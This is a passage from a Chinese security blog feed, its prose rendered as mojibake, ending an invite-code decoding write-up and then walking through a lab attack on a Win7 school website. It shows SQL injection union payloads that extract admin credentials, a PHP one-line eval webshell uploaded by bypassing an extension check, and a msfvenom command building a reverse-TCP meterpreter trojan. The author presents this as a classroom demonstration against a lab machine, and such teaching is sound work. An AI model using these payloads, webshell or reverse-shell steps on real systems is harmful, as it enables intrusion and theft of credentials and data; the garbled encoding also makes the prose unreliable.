<p>ç»™å‡ºä¸€ä¸²æ•°æ®ï¼Œè¿˜æç¤ºæˆ‘ä»¬æ˜¯rot13å¯†æ–‡åŠ å¯†æ–¹å¼ï¼Œäºæ˜¯æˆ‘ä»¬å»è§£è§£çœ‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string  </span><br><span class="line"> </span><br><span class="line">upperdict = &#123;&#125;  </span><br><span class="line">lowerdict = &#123;&#125;  </span><br><span class="line">upperletters =string.ascii_uppercase</span><br><span class="line">lowerletters =string.ascii_lowercase<span class="comment">#ï¼šæ‰€æœ‰å°å†™å­—æ¯</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">dststr = []  </span><br><span class="line">oristr = input(<span class="string">&#x27;Enter string to rot13:&#x27;</span>)<span class="comment">#ç‰ˆæœ¬3.0ä¸èƒ½ç”¨raw_input</span></span><br><span class="line">print(<span class="string">&#x27;Your string ro en/crypt was :&#x27;</span>,oristr ) </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(lowerletters)):                       <span class="comment">#æŠŠæ‰€æœ‰å°å†™å­—æ¯è½¬ä¸ºrot13  </span></span><br><span class="line">	<span class="keyword">if</span> i&lt;<span class="number">13</span>:  </span><br><span class="line">		lowerdict[lowerletters[i]] = lowerletters[i+<span class="number">13</span>]  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		lowerdict[lowerletters[i]] = lowerletters[i<span class="number">-13</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(upperletters)):                       <span class="comment">#æŠŠæ‰€æœ‰å¤§å†™å­—æ¯è½¬ä¸ºrot13  </span></span><br><span class="line">	<span class="keyword">if</span> i&lt;<span class="number">13</span>:  </span><br><span class="line">		lowerdict[upperletters[i]] = upperletters[i+<span class="number">13</span>]  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		lowerdict[upperletters[i]] = upperletters[i<span class="number">-13</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> oristr:  </span><br><span class="line">	<span class="keyword">if</span> ch <span class="keyword">in</span> lowerdict:  </span><br><span class="line">		dststr.append(lowerdict[ch])  </span><br><span class="line">	<span class="keyword">elif</span> ch <span class="keyword">in</span> upperdict:  </span><br><span class="line">		dststr.append(upperdict[ch])  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		dststr.append(ch)  </span><br><span class="line">dststr = <span class="string">&#x27;&#x27;</span>.join(dststr)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">print(<span class="string">&#x27;the rot13 string is:&#x27;</span>,dststr ) </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/sff2132.png" alt=""></p>
<p><strong>è§£å¯†ç»“æœï¼š</strong></p>
<p>In order to generate the invite code, make a POST request to /api/invite/generate</p>
<p>è¦æƒ³è·å¾—æ³¨å†Œé‚€è¯·ç ï¼Œå¿…é¡»ä½¿ç”¨postæ–¹å¼å‘æ­¤å¤„åœ°å€å‘é€è¯·æ±‚è·å–ï¼Œäºæ˜¯æˆ‘ä»¬é©¬ä¸åœè¹„å¾—æºœå»å‘é€è¯·æ±‚~~</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/1231321.png" alt=""></p>
<p>è¿”å›ä¸€æ®µè¢«base64æ–¹å¼åŠ å¯†çš„å¯†æ–‡ï¼Œæˆ‘ä»¬å†æ¬¡è·‘å»è§£å¯†base64</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str=<span class="string">&quot;SElNRFctSURTRUwtQkZUVEQtTFBJUkQtSFlTWUI=&quot;</span></span><br><span class="line"></span><br><span class="line">temp = base64.b64decode(str)</span><br><span class="line"></span><br><span class="line">print(temp.decode())</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/12315131.png" alt=""></p>
<p>è¿™ä¸‹å­çœ‹èµ·æ¥æ²¡æœ‰é—®é¢˜äº†ï¼Œæˆ‘ä»¬å¯ä»¥æ„‰å¿«çš„æ‹¿ç€é‚€è¯·ç å»æ³¨å†Œäº†ï¼ï¼ï¼</p>
]]></content>
  </entry>
  <entry>
    <title>æ¨¡æ‹Ÿç½‘ç«™æ”»å‡»åˆ°ææƒçš„å…¨éƒ¨è¿‡ç¨‹</title>
    <url>/posts/46463/</url>
    <content><![CDATA[<h1>å‰è¨€</h1>
<p>ä»Šå¤©å»ç»™æ–°ä¸€å±Šçš„å­¦ç”Ÿæ¼”ç¤ºä¸€æ¬¡ç½‘ç«™æ‹¿webshellåˆ°ç³»ç»Ÿææƒçš„è¿‡ç¨‹ï¼Œä½†ä¸å¹¸çš„æ˜¯ä¸­é—´ç¿»è½¦äº†ï¼Œè€å¹´äººç´§å¼ å¾—å¿˜è®°äº†msfç›‘å¬æœ¨é©¬çš„æŒ‡ä»¤ï¼Œç„¶åå“†å“†å—¦å—¦çš„åœ¨å¤§å®¶çœ¼ä¸‹ï¼Œæ‰“å¼€äº†ç¬”è®°æŸ¥çœ‹ä¸€ä¸‹2333â€¦æ‰€ä»¥æ›´æ–°ä¸€ä¸‹åšå®¢ï¼Œç»™è‡ªå·±ä¸€ä¸ªæ•™è®­QWQã€‚</p>
<h1>å‡†å¤‡å·¥ä½œ</h1>
<p>é¶æœºï¼ˆè¢«æ”»å‡»æ–¹ï¼‰ï¼šwin7ç³»ç»Ÿ<br>
å…¥ä¾µè€…ï¼ˆæ”»å‡»æ–¹ï¼‰ï¼šwin10ç³»ç»Ÿã€kaliç³»ç»Ÿ</p>
<p>é¦–å…ˆå¯åŠ¨win7ç³»ç»Ÿï¼Œæ­å»ºä¸€ä¸ªå¸¸è§çš„æ ¡å›­ç½‘ç«™ï¼Œç„¶åæ˜ å°„åˆ°å±€åŸŸç½‘ï¼Œä½¿å¾—æˆ‘ä»¬èƒ½æ­£å¸¸è®¿é—®<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EUAM0%5DFV1UHQ43O%246FPAM11.png" alt=""></p>
<h1>ä»ç½‘ç«™æ‹¿åˆ°webshell</h1>
<h2 id="sqlæ³¨å…¥æ¼æ´"><a class="header-anchor" href="#sqlæ³¨å…¥æ¼æ´">Â¶</a>sqlæ³¨å…¥æ¼æ´</h2>
<p>æŠŠæ•´ä¸ªç½‘ç«™æµè§ˆå®Œä¸€éåï¼Œæˆ‘ä»¬å‘ç°è¿™é‡Œçš„urlä¸º?id=10ç»“å°¾ï¼Œæˆ‘ä»¬çŒœæµ‹å¯èƒ½æ˜¯ä¸€ä¸ªsqlæ³¨å…¥ç‚¹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%24%28BBF9%7B%40%60VK%5DJ5YB59PLDC8.png" alt=""><br>
é¦–å…ˆæˆ‘ä»¬åœ¨id=10åé¢åŠ ä¸Šä¸€ä¸ªå•å¼•å·â€™è¿›è¡Œåˆ¤æ–­<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%7DR0SQC6%40%25D0%24UCQD%28%7B_JBJB.png" alt=""><br>
è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å‘ç°å›æ˜¾çš„æ•°æ®ä¸æ­£å¸¸ï¼Œäºæ˜¯æˆ‘ä»¬å†åŠ ä¸€ä¸ªæ³¨é‡Šç¬¦å·<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EY%24%60%7BQF%5BOL_7B%7D1490~0NFR.png" alt=""><br>
å‘ç°æ•°æ®è¿™ä¸ªæ—¶å€™å›æ˜¾çš„æ—¶å€™æ˜¯æ­£å¸¸çš„ï¼Œåˆ°è¿™ä¸€æ­¥æˆ‘ä»¬å·²ç»å¯ä»¥ç¡®å®šè¿™é‡Œå­˜åœ¨ä¸€ä¸ªsqlæ³¨å…¥æ¼æ´</p>
<blockquote>
<p>åŸç†æˆ‘ä»¬å¯ä»¥ç®€å•è§£é‡Šä¸€ä¸‹<br>
åœ¨ç½‘ç«™ä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨æ•°æ®åº“å­˜å‚¨ç½‘ç«™æ•°æ®ï¼Œç½‘ç«™å’Œæ•°æ®åº“æ˜¯å­˜åœ¨ä¸€ä¸ªäº¤äº’æ€§ã€‚ç½‘ç«™æ‰€å‘ˆç°çš„å†…å®¹æ˜¯ç”±ä»£ç ä¸­å†™å…¥çš„sqlè¯­å¥è°ƒç”¨æ•°æ®åº“ä¸­çš„å†…å®¹è¿›è¡Œä¸€ä¸ªå‘ˆç°ï¼Œä¾‹å¦‚æˆ‘ä»¬åˆšåˆšçœ‹åˆ°çš„æ–‡å­—ã€‚<br>
è€Œsqlæ³¨å…¥æ¼æ´ä¸€èˆ¬æ˜¯ç”±äºç¨‹åºå‘˜ä¹¦å†™çš„sqlè¯­å¥ä¸è§„èŒƒæ‰€å¯¼è‡´çš„å®‰å…¨äº‹ä»¶ã€‚</p>
</blockquote>
<p>ä¾‹å¦‚ç½‘ç«™æºç ä¸­ä½¿ç”¨å¦‚ä¸‹çš„sqlè¯­å¥è¿›è¡ŒæŸ¥è¯¢<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/1T2AQDR%295S%5B5%5D5%28FBQV%29EU3.png" alt=""><br>
ç»™è¯­å¥ç»“å°¾çš„whereæŸ¥è¯¢æ¡ä»¶åŠ ä¸Šä¸€ä¸ªå•å¼•å·â€™<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/9YFRLV58FSE9%605E%405%7B3F_%25W.png" alt=""><br>
å¾ˆæ˜¾ç„¶ï¼Œæˆ‘ä»¬ä¼ å…¥çš„å•å¼•å·å’Œå‰é¢çš„å•å¼•å·é—­åˆï¼Œåé¢åªæœ‰ä¸€ä¸ªæ— æ³•æˆå¯¹çš„å•å¼•å·ï¼Œç„¶åæŠ¥äº†è¯­æ³•é”™è¯¯ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†åŠ ä¸Š<code>--+</code>æ³¨é‡Šç¬¦å·æ³¨é‡Šæ‰åé¢çš„å•å¼•å·<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/GSUAC7X6IS9%40_SDTJL%5DO4%60J.png" alt=""><br>
è¿™ä¸ªæ—¶å€™æŸ¥è¯¢çš„æ•°æ®å°±ä¼šæ­£ç¡®å›æ˜¾å‡ºæ¥ã€‚</p>
<p>åŸç†ç®€å•è§£é‡Šäº†ä¸€ä¸‹ä¹‹åï¼Œæˆ‘ä»¬å›åˆ°åˆšåˆšçš„ç½‘ç«™ã€‚<br>
è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å‘ç°å­˜åœ¨sqlæ³¨å…¥æ¼æ´ä¹‹åï¼Œæˆ‘ä»¬å°±å¼€å§‹è¿›è¡ŒæŸ¥è¯¢å¯¹æ–¹ç½‘ç«™æ•°æ®åº“çš„æ•°æ®ï¼Œæ‰¾åˆ°ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚ç®¡ç†å‘˜çš„è´¦å·å¯†ç ç­‰ç­‰</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨order byè¯­å¥å¿«é€ŸçŒœè§£å‡ºè¡¨ä¸­çš„åˆ—æ•°<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CZATPZQ%249%293I4%5DQCRB%7BR9G3.png" alt=""><br>
å‘ç°10åˆ—çš„æ—¶å€™æŠ¥é”™ï¼Œè¯´æ˜ä¸è¶³10åˆ—ï¼Œæˆ‘ä»¬ç»§ç»­ç¼©å°èŒƒå›´<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/JT6AZ1LLFZHL%4039EJE8OQ3E.png" alt=""><br>
å†æŸ¥è¯¢ç¬¬8åˆ—çš„æ—¶å€™ï¼Œå‘ç°æ•°æ®å›æ˜¾æ­£ç¡®ï¼Œè¯´æ˜å¯¹æ–¹è¡¨ä¸­å«æœ‰åˆ—æ•°8<br>
æˆ‘ä»¬ä½¿ç”¨union select è‡ªå®šä¹‰æŸ¥è¯¢æµ‹è¯•ä¸€ä¸‹ï¼Œæ³¨æ„æˆ‘ä»¬è¿™é‡Œå‰é¢çš„id=10ï¼Œè¦å†™æˆid=-10ï¼ŒæŠŠè¿™é‡Œçš„æŸ¥è¯¢ç½®ç©º<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/W8%25J%40U4%7D%5BD3HFH%7DNFML%25L_7.png" alt=""><br>
å‘ç°ä¼šåˆ†åˆ«å›æ˜¾ç¬¬ä¸‰åˆ—ã€ç¬¬äº”åˆ—å’Œç¬¬ä¸ƒåˆ—ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥åœ¨ä¸‰ã€äº”ã€ä¸ƒå¤„åšåšæ–‡ç« </p>
<p>æŸ¥è¯¢æ•°æ®åº“åå­—ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.1.167/yxlink/tuku/images.php?id=-10&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EXY%40U7T%25JGYM6%25%7BD0G%29FZF0.png" alt=""><br>
å¾—åˆ°æ•°æ®åº“åå­—ï¼šqzn_zuiai</p>
<p>æŸ¥è¯¢æ•°æ®åº“ä¸­çš„è¡¨åï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.1.167/yxlink/tuku/images.php?id=-10&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;qzn_zuiai&quot;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/64LOR%40WXDA7PCL2%5B8%40OWSJG.png" alt=""><br>
å¾—åˆ°ä¸€å…±se2admin,se2fl,se2hd,se2nr,se2tufl,se2tunr,se2wz,se2zf,sj3skä¹å¼ è¡¨<br>
é€šè¿‡è¡¨åï¼Œæˆ‘ä»¬çŒœæµ‹se2adminå¯èƒ½æ˜¯å­˜å‚¨ç®¡ç†å‘˜è´¦å·å’Œå¯†ç çš„è¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæŸ¥è¯¢è¿™å¼ è¡¨ä¸­çš„æ•°æ®</p>
<p>æŸ¥è¯¢è¡¨se2adminä¸­çš„å­—æ®µï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.1.167/yxlink/tuku/images.php?id=-10&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&quot;se2admin&quot;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/2%24%60DI0KVJHJM5MK_S%29SZ~%40U.png" alt=""><br>
å¾—åˆ°è¡¨ä¸­çš„å­—æ®µå€¼æœ‰idï¼Œnameï¼Œpassç­‰ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æŸ¥è¯¢nameå’Œpassçš„å­—æ®µå€¼</p>
<p>æŸ¥è¯¢å­—æ®µå€¼ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.1.167/yxlink/tuku/images.php?id=-10&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">name</span>,<span class="number">4</span>,pass,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span> <span class="keyword">from</span> se2admin<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/DNM1KIWQ3~%29TL03T%408%5D9G%60X.png" alt=""><br>
æˆ‘ä»¬å¾—åˆ°ç®¡ç†å‘˜è´¦å·ï¼šadminï¼Œç®¡ç†å‘˜è´¦å·å¯†ç ï¼š7fef6171469e80d32c0559f88b377245<br>
å¾ˆæ˜¾ç„¶å¯†ç å€¼æ˜¯è¢«åŠ å¯†çš„md5å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å»ç½‘ä¸Šæ‰¾md5ç½‘ç«™è¿›è¡Œæ’åº“æŸ¥è¯¢<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/N%29%5DIF%40X%25H%29789%7B~MNS6K0%5BY.png" alt=""><br>
å¾—åˆ°ç®¡ç†å‘˜å¯†ç ä¸ºï¼šadmin888<br>
æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æŸ¥æ‰¾è¿™ä¸ªç½‘ç«™çš„åå°åœ°å€ï¼Œæˆ‘ä»¬ä½¿ç”¨å¾¡å‰‘è¿›è¡Œä¸€ä¸ªæ‰«æ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/OV8QOF%25%7D6CVVLGW_5TQ1%5DTN.png" alt=""><br>
å¾¡å‰‘çˆ†å‡ºäº†å¾ˆå¤šæ•æ„Ÿåœ°å€ï¼Œæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªadminçš„ç›®å½•ï¼Œå¯èƒ½æ˜¯åå°åœ°å€ï¼Œæˆ‘ä»¬å»è®¿é—®ä¸€ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/HCYIQ8PD4F%7BU5KVUEVY%7D9WG.png" alt=""><br>
è¾“å…¥æˆ‘ä»¬åˆšåˆšå¾—åˆ°çš„ç®¡ç†å‘˜è´¦å·å’Œå¯†ç admin:admin888<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/P%40R%7BB8STI811URPWC%25%40GQ81.png" alt=""><br>
è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬æˆåŠŸè¿›å…¥å¯¹æ–¹ç½‘ç«™åå°ã€‚</p>
<h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a class="header-anchor" href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´">Â¶</a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h2>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å†è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/A%28GNMR3D%29O%60%29AH3MKVRQ20U.png" alt=""><br>
æˆ‘ä»¬å†™ä¸€ä¸ªç®€å•çš„ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/H6JI8CKP%256M_8%5BFOZ1_VKUS.png" alt=""><br>
è€ƒè™‘åˆ°è¿™é‡Œå¯èƒ½ä¼šå¯¹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸€ä¸ªåç¼€é™åˆ¶ï¼Œä¾‹å¦‚åªèƒ½ä¸Šä¼ jpgæˆ–è€…pngå›¾ç‰‡æ ¼å¼æ–‡ä»¶ç­‰ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠmuma.txtæ”¹æˆmuma.jpgæ ¼å¼<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/P0S3ZG_4XI%29%7BGX14%25RQRYUA.png" alt=""><br>
æˆ‘ä»¬å¼€å¯burpsuiteï¼Œç„¶åç‚¹æäº¤ï¼Œæ‹¦æˆªåˆ°æˆ‘ä»¬å‘é€çš„æ•°æ®åŒ…<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/FK_UC_0%25I%40Q~16XJN7%5B%601CQ.png" alt=""><br>
æˆ‘ä»¬æŠŠmuma.jpgæ”¹å›phpæ–‡ä»¶ç±»å‹ï¼šmuma.php<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%24%7BRYDZJ0T4EZ%29FABTKYE5%24J.png" alt=""><br>
ç„¶åå‘é€æ•°æ®åŒ…<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CC8K%256%7DFP%7DHA%5B2ZUFJP%5DDGE.png" alt=""><br>
okï¼Œå·²ç»ä¸Šä¼ æˆåŠŸï¼Œæˆ‘ä»¬å»æ‰¾æ‰¾æˆ‘ä»¬ä¸Šä¼ åçš„è·¯å¾„<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/V8TW%7BRFNJ%40VVQ6ESZK60QYG.png" alt=""><br>
å¾—åˆ°æˆ‘ä»¬çš„ä¸Šä¼ å®Œæ•´è·¯å¾„ä¸ºï¼š<code>http://192.168.1.167/yxlink/img/img_3699336993.php</code><br>
æˆ‘ä»¬ä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥æˆ‘ä»¬ä¸Šä¼ çš„æœ¨é©¬<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/2_%5DLX62PYEDGHMP%6094SYA%29P.png" alt=""><br>
æˆåŠŸè¿æ¥ï¼Œè¿›å…¥åˆ°å¯¹æ–¹æœåŠ¡å™¨<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/QN_%60%5BB%5BTHV18Z1QFL3L%5B9EP.png" alt=""><br>
åˆ°æ­¤ï¼Œå·²æˆåŠŸæ‹¿åˆ°webshell</p>
<h1>åå¼¹shellè¿æ¥</h1>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ©ç”¨kaliçš„msfåˆ¶ä½œä¸€ä¸ªexeç±»å‹çš„åå¼¹å‹æœ¨é©¬</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=kaliçš„ip LPORT=ç«¯å£ -f ç±»å‹ -o æ–‡ä»¶å</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/YDU1EFKR~H3D%28U6OD6X%7DZ%25U.png" alt=""><br>
æŠŠåšå¥½çš„æœ¨é©¬ï¼Œé€šè¿‡æˆ‘ä»¬èšå‰‘åˆšåˆšè¿æ¥çš„webshellè¿›è¡Œä¸Šä¼ <br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/KUOL~L7CL4S%40%60GJXYIUU%295R.png" alt=""><br>
